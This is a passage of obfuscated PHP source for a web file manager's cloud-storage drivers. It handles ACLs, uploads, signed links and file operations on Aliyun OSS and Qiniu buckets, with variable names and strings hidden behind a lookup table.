$ìÅÈİÍ == $¿ôçöˆ²[1508] || $ìÅÈİÍ == $¿ôçöˆ²[636] ? !0 : !1; } public function canWrite($Ö§§½ş) { $¸Ï…¿£ç = $this->pathAcl($Ö§§½ş); return $¸Ï…¿£ç == $_SERVER[´‹ô¯Œ][636] ? !0 : !1; } public function pathAcl($Øúïî¹€) { $›²Ï‚á¯ =& $_SERVER[´‹ô¯Œ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $˜ü¾ò«³ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Øúïî¹€)); } catch (OSS\Core\OssException $ø¿˜½õ­) { $this->writeLog(__FUNCTION__ . $›²Ï‚á¯[215] . $ø¿˜½õ­->getMessage()); return !1; } $ÓÜÇØÖü = $˜ü¾ò«³ == $›²Ï‚á¯[37] ? $this->bucketAcl : $˜ü¾ò«³; if ($ÓÜÇØÖü == $›²Ï‚á¯[1509]) { return $›²Ï‚á¯[1508]; } if ($ÓÜÇØÖü == $›²Ï‚á¯[1510]) { return $›²Ï‚á¯[636]; } return $ÓÜÇØÖü; } private function chmodPath($íŸû¸­, $Ùú•ºÖ = '') { $ğÚ¦öÒ‹ =& $_SERVER[´‹ô¯Œ]; $ãÕÒÒç” = empty($Ùú•ºÖ) ? $ğÚ¦öÒ‹[1510] : $Ùú•ºÖ; $™ÖÉ ×î = array($ğÚ¦öÒ‹[37], $ğÚ¦öÒ‹[232], $ğÚ¦öÒ‹[1509], $ğÚ¦öÒ‹[1510]); if (!in_array($ãÕÒÒç”, $™ÖÉ ×î)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($íŸû¸­), $ãÕÒÒç”); } catch (OSS\Core\OssException $şÁß‰ñ“) { $this->writeLog(__FUNCTION__ . $ğÚ¦öÒ‹[215] . $şÁß‰ñ“->getMessage()); return !1; } return !0; } public function getContent($Ìéšş¿“) { return $this->fileSubstr($Ìéšş¿“, -1); } public function setContent($°†ƒùÕ, $•«÷ÍŸÅ = '') { $¢Ê§‚”¬ =& $_SERVER[´‹ô¯Œ]; try { $ìÕû‡“… = $this->trafficLimit($¢Ê§‚”¬[1511]); $ºªüğÈÖ = $this->client->putObject($this->bucket, $this->pathEncode($°†ƒùÕ), $•«÷ÍŸÅ, $ìÕû‡“…); } catch (OSS\Core\OssException $Ëäµ°ÆÂ) { $this->writeLog(__FUNCTION__ . $¢Ê§‚”¬[215] . $Ëäµ°ÆÂ->getMessage()); return !1; } $ß•ĞÜÊ’ = array($¢Ê§‚”¬[1505] => trim($ºªüğÈÖ[$¢Ê§‚”¬[1502]], $¢Ê§‚”¬[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($°†ƒùÕ))); $this->updateObjMeta($°†ƒùÕ, $ß•ĞÜÊ’); return isset($ºªüğÈÖ[$¢Ê§‚”¬[1512]][$¢Ê§‚”¬[297]]) ? !0 : !1; } private function updateObjMeta($ûÜäæª‚, $©è£ŒÙ¾) { $ûÜäæª‚ = $this->pathEncode($ûÜäæª‚); try { $À¶·Ã = array(OSS\OssClient::OSS_HEADERS => $©è£ŒÙ¾); $this->client->copyObject($this->bucket, $ûÜäæª‚, $this->bucket, $ûÜäæª‚, $À¶·Ã); } catch (OSS\Core\OssException $€êŒÓ¤Ô) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][215] . $€êŒÓ¤Ô->getMessage()); return !1; } return !0; } public function upload($ı”¡øÓ, $ÚÆºıİ, $×ôï™ì¸ = false, $õ¹¢…×œ = REPEAT_REPLACE) { $ÈÈªæì± =& $_SERVER[´‹ô¯Œ]; $å¿È¸° = trim($ı”¡øÓ, $ÈÈªæì±[8]); $ÎŸãº—— = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ÈÈªæì±[1505] => @md5_file($ÚÆºıİ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ı”¡øÓ))); $ÎŸãº—— = $this->trafficLimit($ÈÈªæì±[1511], $ÎŸãº——); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($å¿È¸°), $ÚÆºıİ, $ÎŸãº——); } catch (OSS\Core\OssException $¼ôÇŞŒ†) { $this->writeLog(__FUNCTION__ . $ÈÈªæì±[215] . $¼ôÇŞŒ†->getMessage()); return !1; } return $this->getPathOuter($ı”¡øÓ); } public function getHost() { $±Ö·Ûà =& $_SERVER[´‹ô¯Œ]; $†¼ú‹†Ú = explode($±Ö·Ûà[211], parent::getHost()); return $†¼ú‹†Ú[0] . $±Ö·Ûà[211] . $this->bucket . $±Ö·Ûà[10] . $†¼ú‹†Ú[1]; } public function uploadFormData($æÈò½·ö, $ˆ×ÊàÊ× = 3600) { $‡ê•‘¨É =& $_SERVER[´‹ô¯Œ]; if (!($áÖÜÙÔí = $this->getHost())) { return !1; } $¾«Ó˜Î× = $ˆ×ÊàÊ×; $–ª„ÒÀ» = date($‡ê•‘¨É[1513], time() + $¾«Ó˜Î×); $ˆ‰ïÆ€• = new DateTime($–ª„ÒÀ»); $Äœøİğ = $ˆ‰ïÆ€•->format(DateTime::ISO8601); $¿ÛÒÁÏ§ = strpos($Äœøİğ, $‡ê•‘¨É[374]); $Äœøİğ = substr($Äœøİğ, 0, $¿ÛÒÁÏ§) . $‡ê•‘¨É[1514]; $Ñƒ¯„Î = 1048576000 * 5; $¤°²ÉÎõ = $this->pathFather($æÈò½·ö); $‰³óøÖ = array($‡ê•‘¨É[265] => $Äœøİğ, $‡ê•‘¨É[268] => array(array($‡ê•‘¨É[1515], 0, $Ñƒ¯„Î), array($‡ê•‘¨É[270], $‡ê•‘¨É[271], $¤°²ÉÎõ))); $¥¬àÁŸÌ = base64_encode(json_encode($‰³óøÖ)); $òâøçŸ­ = base64_encode(hash_hmac($‡ê•‘¨É[1436], $¥¬àÁŸÌ, $this->secret, !0)); $¾ıÙÚ = array($‡ê•‘¨É[1516] => $this->accessKey, $‡ê•‘¨É[280] => $¥¬àÁŸÌ, $‡ê•‘¨É[273] => $‡ê•‘¨É[264], $‡ê•‘¨É[1517] => $òâøçŸ­, $‡ê•‘¨É[209] => $áÖÜÙÔí); $¾ıÙÚ = $this->trafficLimit($‡ê•‘¨É[1511], $¾ıÙÚ, !0); return $¾ıÙÚ; } public function uploadMultiData($Åî÷ˆæ, $å…©ÂŸ = 3600) { $ÑÁã¬ïã =& $_SERVER[´‹ô¯Œ]; if (!($áŒÓì´Å = $this->getHost())) { return !1; } $ÂïÎ¯ÄÈ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Åî÷ˆæ)); return array($ÑÁã¬ïã[284] => $ÂïÎ¯ÄÈ, $ÑÁã¬ïã[209] => $áŒÓì´Å . $ÑÁã¬ïã[8] . $this->pathEncode($Åî÷ˆæ), $ÑÁã¬ïã[285] => gmdate($ÑÁã¬ïã[1518]), $ÑÁã¬ïã[97] => $Åî÷ˆæ); } public function uploadMultiAuth($†Û³£·Õ, $ç©Ï¤İö = array()) { if (isset($ç©Ï¤İö[$_SERVER[´‹ô¯Œ][286]])) { return $this->uploadPartAuth($†Û³£·Õ, $ç©Ï¤İö); } return $this->uploadListAuth($†Û³£·Õ, $ç©Ï¤İö); } private function uploadPartAuth($ãÉù‡å¨, $Çî‹ÀÁÔ = array()) { $ï×¥ØÅ =& $_SERVER[´‹ô¯Œ]; $±¤¦÷æ˜ = $Çî‹ÀÁÔ[$ï×¥ØÅ[97]]; $ïóïÁÉŒ = $this->_getUploadAuth($±¤¦÷æ˜, $Çî‹ÀÁÔ); $åŞÊ¶À = array($ï×¥ØÅ[289] => $ïóïÁÉŒ[$ï×¥ØÅ[289]], $ï×¥ØÅ[285] => $ïóïÁÉŒ[$ï×¥ØÅ[285]]); if (isset($ïóïÁÉŒ[$ï×¥ØÅ[1519]])) { $åŞÊ¶À[$ï×¥ØÅ[1519]] = $ïóïÁÉŒ[$ï×¥ØÅ[1519]]; } return $åŞÊ¶À; } private function uploadListAuth($«™ö¢¶ß, $À¤äÜÃ = array()) { $—İ’¿ù =& $_SERVER[´‹ô¯Œ]; $õÍó˜¡â = $À¤äÜÃ[$—İ’¿ù[97]]; $ï”…³¸ = $À¤äÜÃ[$—İ’¿ù[284]]; $úòŞ¯÷± = $this->client->listParts($this->bucket, $this->pathEncode($õÍó˜¡â), $ï”…³¸); $‚¼±ğ™ = $úòŞ¯÷±->getListPart(); $¸Û»Ó÷¸ = array(); foreach ($‚¼±ğ™ as $İóÎà¬â) { $¸Û»Ó÷¸[] = array($—İ’¿ù[300] => $İóÎà¬â->getPartNumber(), $—İ’¿ù[301] => trim($İóÎà¬â->getETag(), $—İ’¿ù[121])); } if (!$¸Û»Ó÷¸) { return !1; } $±¼¡äƒ = $this->_getUploadAuth($õÍó˜¡â, $À¤äÜÃ); return array($—İ’¿ù[289] => $±¼¡äƒ[$—İ’¿ù[289]], $—İ’¿ù[285] => $±¼¡äƒ[$—İ’¿ù[285]], $—İ’¿ù[292] => $¸Û»Ó÷¸); } private function _getUploadAuth($´«ÀèÂ, $ƒ™ã„¾ó) { $·á’ìá– =& $_SERVER[´‹ô¯Œ]; $ò™¢Áí± = gmdate($·á’ìá–[1518]); $ñÈòËÑ = isset($ƒ™ã„¾ó[$·á’ìá–[286]]) ? $·á’ìá–[256] : $·á’ìá–[291]; $Ñºæáàˆ = array_intersect_key($ƒ™ã„¾ó, array_flip(array($·á’ìá–[286], $·á’ìá–[284]))); ksort($Ñºæáàˆ); $Š…Ú·ƒá = $Ñºæáàˆ ? $·á’ìá–[76] . http_build_query($Ñºæáàˆ, null, $·á’ìá–[287], PHP_QUERY_RFC3986) : $·á’ìá–[12]; $Ğğ–ôŸ“ = array($ñÈòËÑ, $·á’ìá–[12], $·á’ìá–[123], $ò™¢Áí±, "\170\x2d\x6f\x73\x73\x2d\x64\141\164\x65\x3a{$ò™¢Áí±}", $·á’ìá–[8] . $this->bucket . $·á’ìá–[8] . $´«ÀèÂ . $Š…Ú·ƒá); if (isset($ƒ™ã„¾ó[$·á’ìá–[286]])) { $è«‡’ğº = $this->trafficLimit($·á’ìá–[1511], array(), !0); if ($è«‡’ğº) { $´«ÀèÂ = $·á’ìá–[1519]; array_splice($Ğğ–ôŸ“, 5, 0, $´«ÀèÂ . $·á’ìá–[4] . $è«‡’ğº[$´«ÀèÂ]); } } $œìÁÔ™ = implode($·á’ìá–[288], $Ğğ–ôŸ“); $Øå“Ûê = base64_encode(hash_hmac($·á’ìá–[1436], $œìÁÔ™, $this->secret, !0)); $õ±ãŸ ß = $·á’ìá–[1488] . $this->accessKey . $·á’ìá–[4] . $Øå“Ûê; $òÊ¸Ñï = array($·á’ìá–[289] => $õ±ãŸ ß, $·á’ìá–[285] => $ò™¢Áí±); if (!empty($è«‡’ğº)) { $òÊ¸Ñï = array_merge($òÊ¸Ñï, $è«‡’ğº); } return $òÊ¸Ñï; } public function download($ú¥ä Íé, $Ô“©“«Å) { $Àä“øäµ =& $_SERVER[´‹ô¯Œ]; if ($this->isFolder($ú¥ä Íé)) { return !1; } try { $Ñüù£÷¯ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ô“©“«Å); $Ñüù£÷¯ = $this->trafficLimit($Àä“øäµ[112], $Ñüù£÷¯); $this->client->getObject($this->bucket, $this->pathEncode($ú¥ä Íé), $Ñüù£÷¯); } catch (OSS\Core\OssException $¤°¡ Ä‘) { $this->writeLog(__FUNCTION__ . $Àä“øäµ[215] . $¤°¡ Ä‘->getMessage()); return !1; } return $Ô“©“«Å; } public function fileSubstr($áŒÄ€†±, $ê¶Ïé²¯ = 0, $À¨£ûî­ = false) { if ($ê¶Ïé²¯ === -1) { $¤®–Üúı = array(); } else { if ($À¨£ûî­ === !1) { $èÉşœò = $this->size($áŒÄ€†±); } else { $èÉşœò = $ê¶Ïé²¯ + $À¨£ûî­ - 1; } $¤®–Üúı = array(OSS\OssClient::OSS_RANGE => "{$ê¶Ïé²¯}\x2d{$èÉşœò}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($áŒÄ€†±), $¤®–Üúı); } catch (OSS\Core\OssException $–œŞ Öß) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][215] . $–œŞ Öß->getMessage()); think_exception($–œŞ Öß->getMessage()); return !1; } } private function trafficLimit($·Ã»É–, $ö­İ†¸Â = array(), $İ›£é = false) { $î¡£¹š =& $_SERVER[´‹ô¯Œ]; if ($·Ã»É– == $î¡£¹š[1511] && $this->isUploadServer() || $·Ã»É– == $î¡£¹š[112] && $this->isFileOutServer()) { return $ö­İ†¸Â; } $Óâ¢Ö«© = floatval($GLOBALS[$î¡£¹š[6]][$î¡£¹š[92]][$î¡£¹š[110]][$·Ã»É–]) * 1024 * 1024 * 8; if (!$Óâ¢Ö«©) { return $ö­İ†¸Â; } $Óâ¢Ö«© = $Óâ¢Ö«© < 819200 ? 819200 : ($Óâ¢Ö«© > 838860800 ? 838860800 : $Óâ¢Ö«©); if ($İ›£é) { $ö­İ†¸Â[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Óâ¢Ö«©); } else { if (!isset($ö­İ†¸Â[OSS\OssClient::OSS_HEADERS])) { $ö­İ†¸Â[OSS\OssClient::OSS_HEADERS] = array(); } $ö­İ†¸Â[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Óâ¢Ö«©); } return $ö­İ†¸Â; } public function link($£ì˜“åÆ, $Ñ¿¹²´Õ = array()) { $ñí‚Â¬© =& $_SERVER[´‹ô¯Œ]; if (!$this->exist($£ì˜“åÆ) || $this->isFolder($£ì˜“åÆ)) { return !1; } try { $Ñ¿¹²´Õ = $this->trafficLimit($ñí‚Â¬©[112], $Ñ¿¹²´Õ, !0); $×…ç¥Š± = $this->client->signUrl($this->bucket, $this->pathEncode($£ì˜“åÆ), 3600 * 12, $ñí‚Â¬©[1520], $Ñ¿¹²´Õ); return $this->getCdnLink($×…ç¥Š±); } catch (OSS\Core\OssException $ÕŒæ¤µ) { $this->writeLog(__FUNCTION__ . $ñí‚Â¬©[215] . $ÕŒæ¤µ->getMessage()); return !1; } } public function fileOut($¢õ¤µ¯Ö, $»‹ÔÏç = false, $×è‰Ê‡ = false, $…×ÚûÓ¡ = '') { $«˜İ‚òô =& $_SERVER[´‹ô¯Œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¢õ¤µ¯Ö, $»‹ÔÏç, $×è‰Ê‡, $…×ÚûÓ¡); } if (!$×è‰Ê‡) { $×è‰Ê‡ = $this->pathThis($¢õ¤µ¯Ö); } $×è‰Ê‡ = rawurlencode($×è‰Ê‡); $Öƒç×³¾ = get_file_mime(get_path_ext($×è‰Ê‡)); if ($Öƒç×³¾ == $«˜İ‚òô[251]) { return parent::fileOut($¢õ¤µ¯Ö, $»‹ÔÏç, $×è‰Ê‡, $…×ÚûÓ¡); } $»‹ÔÏç = $»‹ÔÏç ? $«˜İ‚òô[1521] : $«˜İ‚òô[1522]; $ËÖœê¯ = array(OSS\OssClient::OSS_SUB_RESOURCE => $«˜İ‚òô[1523] . rawurlencode("{$»‹ÔÏç}\x3b\146\151\x6c\145\x6e\141\155\x65\75{$×è‰Ê‡}")); $Àí³Ô¿ = $this->link($¢õ¤µ¯Ö, $ËÖœê¯); $this->fileOutLink($Àí³Ô¿); } public function fileOutServer($è§‹”´, $ùŠã×ã = false, $·«êÒü¨ = false, $íÃäÆ¸Í = '') { parent::fileOut($è§‹”´, $ùŠã×ã, $·«êÒü¨, $íÃäÆ¸Í); } public function fileOutImage($´ÔäÌé¿, $âĞéÃú¯ = 250) { if ($this->size($´ÔäÌé¿) > 1024 * 1024 * 20) { return $this->fileOutImageServer($´ÔäÌé¿, $âĞéÃú¯); } $‡˜şöş“ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[´‹ô¯Œ][1485] . $âĞéÃú¯); $êÈãµÇõ = $this->link($´ÔäÌé¿, $‡˜şöş“); $this->fileOutLink($êÈãµÇõ); } public function fileOutImageServer($¬´”—, $×ï’æ½ = 250) { parent::fileOutImage($¬´”—, $×ï’æ½); } public function fileOutLink($ƒ–í›–Æ) { $‚şÁ÷Ó¨ =& $_SERVER[´‹ô¯Œ]; if (!$this->isCdnHost() && substr($ƒ–í›–Æ, 0, 7) == $‚şÁ÷Ó¨[219]) { $ƒ–í›–Æ = $‚şÁ÷Ó¨[220] . substr($ƒ–í›–Æ, 7); } header($‚şÁ÷Ó¨[175] . $ƒ–í›–Æ); die; } public function hashMd5($—Èş’ÂÅ, $§õÚËúë = '') { $Ì»îš• =& $_SERVER[´‹ô¯Œ]; $½ğáó» = $this->_objectMeta($—Èş’ÂÅ); if (!$½ğáó») { return $Ì»îš•[12]; } if (!isset($½ğáó»[$Ì»îš•[1505]]) && !empty($§õÚËúë)) { $½ïª”ùş = $this->updateObjMeta($—Èş’ÂÅ, array($Ì»îš•[1505] => $§õÚËúë)); $½ğáó»[$Ì»îš•[1505]] = $½ïª”ùş ? $§õÚËúë : $Ì»îš•[12]; } return isset($½ğáó»[$Ì»îš•[1505]]) ? strtolower($½ğáó»[$Ì»îš•[1505]]) : $Ì»îš•[12]; } public function size($à¯š¾¸Ò) { $íûü• = $this->objectMeta($à¯š¾¸Ò); return $íûü• ? $íûü•[$_SERVER[´‹ô¯Œ][79]] : 0; } public function info($©ôŠîÙø) { if ($this->isFolder($©ôŠîÙø)) { return $this->folderInfo($©ôŠîÙø); } else { if ($this->isFile($©ôŠîÙø)) { return $this->fileInfo($©ôŠîÙø); } } return !1; } public function exist($øş™Åƒ®) { return $this->isFile($øş™Åƒ®) || $this->isFolder($øş™Åƒ®); } public function isFile($éàŒƒò½) { return !$this->isFolder($éàŒƒò½) && $this->objectMeta($éàŒƒò½); } public function isFolder($Ú´¦öĞ») { return $this->cacheMethod($_SERVER[´‹ô¯Œ][180], $Ú´¦öĞ»); } protected function objectMeta($Õ§ç„ö¥) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][182], $Õ§ç„ö¥); } protected function _objectMeta($¡Š™ò–¬) { $™Ä¾ğºú =& $_SERVER[´‹ô¯Œ]; try { $âÍÚà¦Ó = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¡Š™ò–¬)); } catch (OSS\Core\OssException $²ÀÉœ»À) { $this->writeLog(__FUNCTION__ . $™Ä¾ğºú[215] . $²ÀÉœ»À->getMessage()); $âÍÚà¦Ó = !1; } if ($âÍÚà¦Ó) { $âÍÚà¦Ó[$™Ä¾ğºú[79]] = intval($âÍÚà¦Ó[$™Ä¾ğºú[1503]]); } return $âÍÚà¦Ó; } protected function _isFolder($Šõç‡¾ƒ) { $¸áïÆ¼ƒ =& $_SERVER[´‹ô¯Œ]; if ($Šõç‡¾ƒ == $¸áïÆ¼ƒ[12] || $Šõç‡¾ƒ == $¸áïÆ¼ƒ[8]) { return !0; } $Ş¨ºÏ° = array($¸áïÆ¼ƒ[1498] => $¸áïÆ¼ƒ[8], $¸áïÆ¼ƒ[1499] => rtrim($Šõç‡¾ƒ, $¸áïÆ¼ƒ[8]) . $¸áïÆ¼ƒ[8], $¸áïÆ¼ƒ[1500] => 1, $¸áïÆ¼ƒ[1501] => $¸áïÆ¼ƒ[12]); $šÏ‘Äè = $this->client->listObjects($this->bucket, $Ş¨ºÏ°); if ($šÏ‘Äè->getObjectList() || $šÏ‘Äè->getPrefixList()) { return !0; } return !1; } public function writeLog($³Åùö­œ = '', $îòù©şÀ = false) { $âû ¼š =& $_SERVER[´‹ô¯Œ]; $¶“æ…×ğ = in_array(ACTION, array($âû ¼š[213], $âû ¼š[214])); if (!$¶“æ…×ğ && !GLOBAL_DEBUG) { return; } $ÆèßıË‡ = 0; if (stripos($³Åùö­œ, $âû ¼š[1524]) !== !1) { $ÆèßıË‡ = 1; $•‰õıÀü = explode($âû ¼š[1525], $³Åùö­œ); $³Åùö­œ = !empty($•‰õıÀü[1]) ? $•‰õıÀü[1] : $³Åùö­œ; } else { if (stripos($³Åùö­œ, $âû ¼š[1526])) { $ÆèßıË‡ = 2; $•‰õıÀü = explode($âû ¼š[1526], $³Åùö­œ); $•‰õıÀü = explode($âû ¼š[4], $•‰õıÀü[0]); $³Åùö­œ = !empty($•‰õıÀü[1]) ? $•‰õıÀü[1] : $³Åùö­œ; } } if ($¶“æ…×ğ && I18n::getType() == $âû ¼š[1527]) { if ($ÆèßıË‡ == 1) { $³Åùö­œ = str_replace($âû ¼š[1528], $âû ¼š[1529], $³Åùö­œ); } else { if ($ÆèßıË‡ == 2) { $•‰õıÀü = explode($âû ¼š[215], $•‰õıÀü[0]); $„¯¼ÙÖä = isset($•‰õıÀü[1]) ? $•‰õıÀü[1] : $âû ¼š[12]; $éèÅÇÇÓ = array($âû ¼š[1530] => $âû ¼š[1531], $âû ¼š[1532] => $âû ¼š[1533], $âû ¼š[1534] => $âû ¼š[1535], $âû ¼š[1536] => $âû ¼š[1537], $âû ¼š[1538] => $âû ¼š[1539], $âû ¼š[1540] => $âû ¼š[1541], $âû ¼š[1542] => $âû ¼š[1543], $âû ¼š[1544] => $âû ¼š[1545], $âû ¼š[1546] => $âû ¼š[1547], $âû ¼š[1548] => $âû ¼š[1549]); if (isset($éèÅÇÇÓ[$„¯¼ÙÖä])) { $³Åùö­œ = $éèÅÇÇÓ[$„¯¼ÙÖä]; } } } if (stripos($³Åùö­œ, $âû ¼š[1550])) { $³Åùö­œ = $âû ¼š[1551]; } } if (!trim($³Åùö­œ)) { return; } parent::writeLog(trim($³Åùö­œ), $îòù©şÀ); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¯ÛÃ§îš) { parent::__construct(); require_once SDK_DIR . $_SERVER[´‹ô¯Œ][1552]; $this->_init($¯ÛÃ§îš); } public function _init($‚„±ˆ×à) { $§…úãºÛ =& $_SERVER[´‹ô¯Œ]; $this->config = $‚„±ˆ×à; foreach ($‚„±ˆ×à as $í¤ˆ´‰ => $ğ˜¼²) { if (isset($this->{$í¤ˆ´‰})) { $this->{$í¤ˆ´‰} = $ğ˜¼²; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($§…úãºÛ[1553] . LNG($§…úãºÛ[1489])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ó¬Ğİûş, $Óåİø¾ = '', $¡ğü‹ˆ• = REPEAT_RENAME) { if ($this->setContent($ó¬Ğİûş, $Óåİø¾)) { return $this->getPathOuter($ó¬Ğİûş); } return !1; } public function mkdir($¶è‚’¶Â, $ÔÍ¸¾à¦ = REPEAT_SKIP) { $Ø—í¶“Ü =& $_SERVER[´‹ô¯Œ]; $Êîãî‡å = trim($¶è‚’¶Â, $Ø—í¶“Ü[8]); if ($this->_isFolder($Êîãî‡å)) { return $this->getPathOuter($Êîãî‡å); } $¶è‚’¶Â = $Êîãî‡å . $Ø—í¶“Ü[8]; $¢°êı” = get_path_this($Êîãî‡å); $€üšóÄÖ = $¶è‚’¶Â . $¢°êı”; if (!$this->mkfile($€üšóÄÖ)) { return !1; } if (!$this->moveFile($€üšóÄÖ, $¶è‚’¶Â)) { $this->delFile($€üšóÄÖ); return !1; } return $this->getPathOuter($Êîãî‡å); } public function copyFile($¿¹™×„ë, $Å‰”î¹œ) { $Ê°¦”âš = $this->bucketManager->copy($this->bucket, $¿¹™×„ë, $this->bucket, $Å‰”î¹œ, !0); return $Ê°¦”âš ? !1 : $this->getPathOuter($Å‰”î¹œ); } public function moveFile($úØ”Á€º, $Ÿä’÷ìÏ) { $çò˜À¿È = $this->bucketManager->move($this->bucket, $úØ”Á€º, $this->bucket, $Ÿä’÷ìÏ, !0); return $çò˜À¿È ? !1 : $this->getPathOuter($Ÿä’÷ìÏ); } public function delFile($ªÖ×Û¿) { if (!$this->exist($ªÖ×Û¿)) { return !0; } $í¿œèÒû = $this->bucketManager->delete($this->bucket, $ªÖ×Û¿); if (!$í¿œèÒû) { return !0; } return $í¿œèÒû->code() == 612 ? !0 : !1; } public function delFolder($é®Ñàéà) { $ŞúŒò®¤ =& $_SERVER[´‹ô¯Œ]; if (!$this->exist($é®Ñàéà)) { return !0; } $this->listItemCache = !1; $Ù†ÒÊĞÎ = $this->fileList($é®Ñàéà); $this->listItemCache = !0; $‰ˆı¨©Ö = trim($é®Ñàéà, $ŞúŒò®¤[8]) . $ŞúŒò®¤[8]; if (!empty($é®Ñàéà) && $é®Ñàéà !== $ŞúŒò®¤[231] && !in_array($‰ˆı¨©Ö, $Ù†ÒÊĞÎ[$ŞúŒò®¤[85]])) { $Ù†ÒÊĞÎ[$ŞúŒò®¤[85]][] = $‰ˆı¨©Ö; } $´ï“ç©† = $this->delByBatch($Ù†ÒÊĞÎ[$ŞúŒò®¤[86]]); if (!$´ï“ç©†) { return !1; } $´ï“ç©† = $this->delByBatch($Ù†ÒÊĞÎ[$ŞúŒò®¤[85]]); if (!$´ï“ç©†) { return !1; } return $this->delFile($‰ˆı¨©Ö); } private function delByBatch($©¹½ƒˆÏ) { foreach (array_chunk($©¹½ƒˆÏ, 1000) as $ŠêÕª¬›) { $Œà·˜¼ˆ = $this->bucketManager->buildBatchDelete($this->bucket, $ŠêÕª¬›); list($ñÛì®¹¢, $Ö¬ĞŒŠü) = $this->bucketManager->batch($Œà·˜¼ˆ); if ($Ö¬ĞŒŠü) { return !1; } } return !0; } public function rename($…†ÈÆŠ¸, $‰çÖ“«Ñ) { return $this->renameObject($…†ÈÆŠ¸, $‰çÖ“«Ñ); } public function fileInfo($æáüã¨¸, $®£ïÜ¿Š = false, $–šÑêÁ½ = array()) { $Ñ½¨Éö =& $_SERVER[´‹ô¯Œ]; $È²£éá‡ = array($Ñ½¨Éö[32] => $this->pathThis($æáüã¨¸), $Ñ½¨Éö[87] => $this->getPathOuter($Ñ½¨Éö[8] . $æáüã¨¸), $Ñ½¨Éö[33] => $Ñ½¨Éö[233], $Ñ½¨Éö[79] => isset($–šÑêÁ½[$Ñ½¨Éö[1554]]) ? $–šÑêÁ½[$Ñ½¨Éö[1554]] : 0, $Ñ½¨Éö[169] => $this->ext($æáüã¨¸)); if ($®£ïÜ¿Š) { return $È²£éá‡; } $È²£éá‡[$Ñ½¨Éö[234]] = $È²£éá‡[$Ñ½¨Éö[88]] = 0; $È²£éá‡[$Ñ½¨Éö[235]] = $È²£éá‡[$Ñ½¨Éö[236]] = !0; if (empty($–šÑêÁ½)) { $–šÑêÁ½ = $this->objectMeta($æáüã¨¸); if (!$–šÑêÁ½) { return $È²£éá‡; } } if (isset($–šÑêÁ½[$Ñ½¨Éö[237]]) && $–šÑêÁ½[$Ñ½¨Éö[237]]) { $È²£éá‡[$Ñ½¨Éö[238]] = $–šÑêÁ½[$Ñ½¨Éö[237]]; } if (isset($–šÑêÁ½[$Ñ½¨Éö[248]]) && $–šÑêÁ½[$Ñ½¨Éö[248]]) { $È²£éá‡[$Ñ½¨Éö[238]] = $–šÑêÁ½[$Ñ½¨Éö[248]]; } if (isset($–šÑêÁ½[$Ñ½¨Éö[1555]])) { $È²£éá‡[$Ñ½¨Éö[88]] = substr($–šÑêÁ½[$Ñ½¨Éö[1555]] . $Ñ½¨Éö[12], 0, 10); } if (isset($–šÑêÁ½[$Ñ½¨Éö[1554]])) { $È²£éá‡[$Ñ½¨Éö[79]] = $–šÑêÁ½[$Ñ½¨Éö[1554]]; } return $È²£éá‡; } public function folderInfo($©ÚÖ—§à, $Ä­óÁ¹ = false) { $ÉÚ“òğ =& $_SERVER[´‹ô¯Œ]; $éØ»»€ò = array($ÉÚ“òğ[32] => $this->pathThis($©ÚÖ—§à), $ÉÚ“òğ[87] => $this->getPathOuter($ÉÚ“òğ[8] . $©ÚÖ—§à), $ÉÚ“òğ[33] => $ÉÚ“òğ[78]); if ($Ä­óÁ¹) { return $éØ»»€ò; } $éØ»»€ò[$ÉÚ“òğ[234]] = $éØ»»€ò[$ÉÚ“òğ[88]] = 0; $éØ»»€ò[$ÉÚ“òğ[235]] = $éØ»»€ò[$ÉÚ“òğ[236]] = !0; $©ÚÖ—§à = rtrim($©ÚÖ—§à, $ÉÚ“òğ[8]) . $ÉÚ“òğ[8]; $ìúÏ†Ø« = $this->objectMeta($©ÚÖ—§à); if (isset($ìúÏ†Ø«[$ÉÚ“òğ[1555]])) { $éØ»»€ò[$ÉÚ“òğ[88]] = substr($ìúÏ†Ø«[$ÉÚ“òğ[1555]] . $ÉÚ“òğ[12], 0, 10); } return $éØ»»€ò; } public function listPath($äšçı´û, $ËÉ†¾Í = false) { $í“Ê‹ =& $_SERVER[´‹ô¯Œ]; $ù¶¢…Ğ£ = $this->fileList($äšçı´û, $í“Ê‹[8], !0); foreach ($ù¶¢…Ğ£[$í“Ê‹[85]] as $× ÏŒïû => $ø™³ùª‚) { $ù¶¢…Ğ£[$í“Ê‹[85]][$× ÏŒïû] = $this->folderInfo($ø™³ùª‚, $ËÉ†¾Í); } foreach ($ù¶¢…Ğ£[$í“Ê‹[86]] as $× ÏŒïû => $ø™³ùª‚) { $ù¶¢…Ğ£[$í“Ê‹[86]][$× ÏŒïû] = 